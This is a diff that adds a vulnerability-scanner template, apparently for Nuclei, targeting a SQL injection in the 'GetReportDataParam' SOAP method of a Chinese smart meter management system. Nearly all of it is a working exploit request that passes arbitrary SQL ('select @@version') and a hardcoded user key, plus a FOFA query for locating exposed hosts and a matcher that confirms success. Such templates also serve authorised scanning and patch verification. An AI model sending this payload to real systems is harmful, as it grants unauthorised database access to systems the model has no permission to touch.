@@ -1,0 +1,46 @@
+id: smartmanager-GetReportDataParam-sqli
+info:
+  name: 智能表综合管理系统 GetReportDataParam Sql注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59047/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="headerTableWrap"
+    tips:
+    repair:
+    version:
+  tags: sqli,smartmanager
+
+http:
+  - raw:
+      - |
+        POST /SunReportService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.1868.41 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://suntront.com/GetReportDataParam "
+        Content-Length: 456
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetReportDataParam xmlns="http://suntront.com/">
+              <sqltxt>select @@version</sqltxt>
+              <SqlParam>{"a":"1"}</SqlParam>
+              <Userkey>XTSunReport</Userkey>
+            </GetReportDataParam>
+          </soap:Body>
+        </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
